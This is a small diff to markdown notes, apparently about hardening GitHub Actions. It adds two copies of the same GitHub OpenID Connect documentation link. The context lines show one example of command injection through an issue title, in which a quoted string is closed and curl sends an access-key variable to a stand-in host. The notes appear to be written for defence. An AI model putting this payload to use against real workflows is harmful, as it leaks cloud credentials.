@@ -7,3 +7,7 @@
 ### Simple examples of injectin
 Opening issues with titles like
 - ``"a"; curl http://my-bad-site.com?abc=$MINHA_ACCESS_KEY_ID"``
+
+### Docs
+https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect
+https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect
